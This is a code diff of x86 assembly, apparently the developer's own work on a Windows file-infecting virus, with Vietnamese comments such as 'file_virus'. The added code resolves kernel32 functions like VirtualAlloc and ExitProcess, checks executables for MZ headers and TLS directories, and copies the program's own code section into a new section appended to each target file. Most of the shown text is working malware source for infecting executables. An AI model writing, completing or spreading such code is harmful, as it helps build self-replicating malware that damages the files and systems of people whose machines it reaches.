@@ -170,6 +170,26 @@ push	ebx
 call	ecx
 mov		[offset msz + ebp], eax
 
+;Lay ham VirtualAlloc
+mov		eax, offset viralloc
+add		eax, ebp
+mov		ebx, [offset kernel32 + ebp]
+mov		ecx, [offset gpa + ebp] 
+push	eax
+push	ebx
+call	ecx
+mov		[offset virAlloc + ebp], eax
+
+;Lay ham VirtualFree
+mov		eax, offset virfree
+add		eax, ebp
+mov		ebx, [offset kernel32 + ebp]
+mov		ecx, [offset gpa + ebp] 
+push	eax
+push	ebx
+call	ecx
+mov		[offset virFree + ebp], eax
+
 ;Lay ham CreateFile
 mov		eax, offset createfile
 add		eax, ebp
@@ -229,6 +249,15 @@ push	eax
 push	ebx
 call	ecx
 mov		[offset clh + ebp], eax
+;Lay ham exit
+mov		eax, offset exit
+add		eax, ebp
+mov		ebx, [offset kernel32 + ebp]
+mov		ecx, [offset gpa + ebp] 
+push	eax
+push	ebx
+call	ecx
+mov		[offset exitprocess + ebp], eax
 
 ;Lay ham GetModuleFileName
 mov		eax, offset getpathfile
@@ -296,6 +325,7 @@ call	browse_files
 
 lea		eax, mg
 add		eax, ebp
+mov		eax, [eax]
 mov		ebx, offset tit
 add		ebx, ebp
 push	0
@@ -416,7 +446,7 @@ mov		eax, offset clh
 add		eax, ebp
 mov		eax, [eax]
 
-mov		ebx, h_file
+lea		ebx, h_file
 add		ebx, ebp
 mov		ebx, [ebx]
 push	ebx
@@ -425,8 +455,17 @@ call	eax
 ;-----------------------
 mov		eax, tmp_2
 add		eax, tmp_3
-
+cmp		eax, 00000000h
+je		file_virus
 jmp		eax
+file_virus:
+lea		eax, exitprocess
+add		eax, ebp
+mov		eax, [eax]
+xor		ebx, ebx
+
+push	0
+call	eax
 ;---------------------------------------------------------------------
 inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	
@@ -616,6 +655,16 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	sub		ebx, eax
 	mov		delta_aop, ebx
 	
+	mov		eax, [section+10h]
+	lea		ebx, raw_size
+	add		ebx, del
+	mov		[ebx], eax
+
+	mov		eax, [section+14h]
+	lea		ebx, raw_virus
+	add		ebx, del
+	mov		[ebx], eax
+	
 	;readfile injected
 	lea		eax, ov
 	add		eax, 8h					
@@ -780,6 +829,9 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	add		ebx, 14h
 	mov		dword ptr [ebx], eax	;sua raw address
 	
+	lea		ebx, raw_injected
+	add		ebx, del
+	mov		[ebx], eax
 	;-----------------
 	lea		eax, section_final
 	add		eax, 8h
@@ -980,6 +1032,80 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	
 	;Them Section vao cuoi file
 	
+	lea		eax, raw_size
+	add		eax, del
+	mov		eax, dword ptr [eax]
+	add		eax, 0100h
+	lea		ebx, virAlloc
+	add		ebx, del
+	mov		ebx, [ebx]
+	
+	push	04h
+	push	03000h
+	push	eax
+	push	0
+	call	ebx					;cap phat bo nho de doc code thuc thi
+	
+	lea		ebx,tmp_9
+	add		ebx, del
+	mov		[ebx], eax			;luu dia chi duoc cap phat
+	mov		ebx, eax
+	lea		eax, ov
+	lea		ecx, raw_size
+	add		ecx, del
+	mov		ecx, [ecx]
+	
+	mov		edx, del
+	add		edx, offset rf
+	mov		edx, [edx]
+	add		eax, 08h
+	lea		edi, raw_virus
+	add		edi, del
+	mov		edi, [edi]
+	mov		[eax], edi	
+	lea		eax, ov
+	
+	
+	push	eax
+	push	0
+	push	ecx							;4 byte
+	push	ebx							;buffer
+	push	this_file_virus_handle		;handle
+	call	edx							;ReadFile
+	;doc du lieu thuc thi vao vung nho duoc cap phat
+	
+	
+	
+	lea		ebx, wf
+	add		ebx, del
+	mov		ebx, [ebx]
+	
+	lea		ecx, raw_size
+	add		ecx, del
+	mov		ecx, [ecx]
+	
+	lea		eax,tmp_9
+	add		eax, del
+	mov		[eax], eax
+	
+	lea		edx, ov
+	add		edx, 08h
+	
+	lea		edi, raw_injected
+	add		edi, del
+	mov		edi, [edi]
+	mov		[edx], edi
+	
+	lea 	edx, ov
+	
+	push	edx
+	push 	0
+	push	ecx
+	push	eax
+	push	handleF
+	call	ebx	
+	
+	
 	end_inject_file:
 	ret
 
@@ -1142,23 +1268,24 @@ xor		eax, eax
 mov		eax, del
 add		eax, offset tmp
 mov		eax, [eax]
-
+;so sanh MZ
 cmp		ax, 5a4dh
 
 jne		close_handle
 
-;------------------------------------------
+;e_lfanew------------------------------------------
+
 lea		edx, ovl
 add		edx, 8
 mov		dword ptr [edx], 60
 
 lea		eax, tmp_5
 mov		ebx, offset rf
-add		ebx, ebp
+add		ebx, del
 mov		ebx, [ebx]
 
 mov		ecx, offset h_file
-add		ecx, ebp
+add		ecx, del
 mov		ecx, [ecx]
 lea		edx, ovl
 
@@ -1168,23 +1295,23 @@ push	4
 push	eax	
 push	ecx
 call	ebx
-;----------------------------------------
+;tls directory rva----------------------------------------
 mov		eax, tmp_5
 add		eax, 0c0h
 
 lea		edx, ovl
-add		edx, ebp
+add		edx, del
 add		edx, 8
 mov		dword ptr [edx], eax
 
 lea		eax, tmp_6
-add		eax, ebp
+add		eax, del
 mov		ebx, offset rf
-add		ebx, ebp
+add		ebx, del
 mov		ebx, [ebx]
 
 mov		ecx, offset h_file
-add		ecx, ebp
+add		ecx, del
 mov		ecx, [ecx]
 lea		edx, ovl
 
@@ -1194,24 +1321,24 @@ push	4
 push	eax	
 push	ecx
 call	ebx
-;----------------------------------------------
+;tls directory size----------------------------------------------
 
 mov		eax, tmp_5
 add		eax, 0c4h
 
 lea		edx, ovl
-add		edx, ebp
+add		edx, del
 add		edx, 8
 mov		dword ptr [edx], eax
 
 lea		eax, tmp_5
-add		eax, ebp
+add		eax, del
 mov		ebx, offset rf
-add		ebx, ebp
+add		ebx, del
 mov		ebx, [ebx]
 
 mov		ecx, offset h_file
-add		ecx, ebp
+add		ecx, del
 mov		ecx, [ecx]
 lea		edx, ovl
 
@@ -1221,7 +1348,7 @@ push	4
 push	eax	
 push	ecx
 call	ebx
-;---------------------------------
+;kiem tra neu car RVA va Size cung = 0 thi lay neu k thi bo qua---------------------------------
 xor		eax, eax
 mov		eax, tmp_6
 cmp		eax, 0
@@ -1422,6 +1549,9 @@ tmp				dd 0
 clh				dd 0
 user32			dd 0
 load			dd 0
+virAlloc		dd 0
+virFree			dd 0
+exitprocess		dd 0
 
 tit				db "Hello world" , 0
 getprocaddress 	db "GetProcAddress", 0
@@ -1433,6 +1563,8 @@ messagebox		db "MessageBoxA", 0
 loadlib			db "LoadLibraryA", 0
 lib_user32		db "user32.dll", 0
 virtualprotect	db "VirtualProtect", 0
+viralloc		db "VirtualAlloc", 0
+virfree			db "VirtualFree", 0
 getpath			db "GetCurrentDirectoryA", 0
 createfile 		db "CreateFileA", 0
 getpathfile		db "GetModuleFileNameA", 0
@@ -1441,12 +1573,19 @@ memsetzero		db "RtlZeroMemory", 0
 len				db "lstrlenA", 0
 cpy				db "lstrcpyA", 0
 
+exit			db "ExitProcess", 0
+
 clshandle		db "CloseHandle", 0		 
 
 file_name		db 262 dup(0)
 tmp_1			dd 0
 tmp_2			dd 0
 tmp_3			dd 0
+tmp_9			dd 0
+
+raw_size		dd 0
+raw_virus		dd 0
+raw_injected 	dd 0
 ;_win32_find_data
 dwFileAttributes    dd 0
 time				dd 6 dup(0)
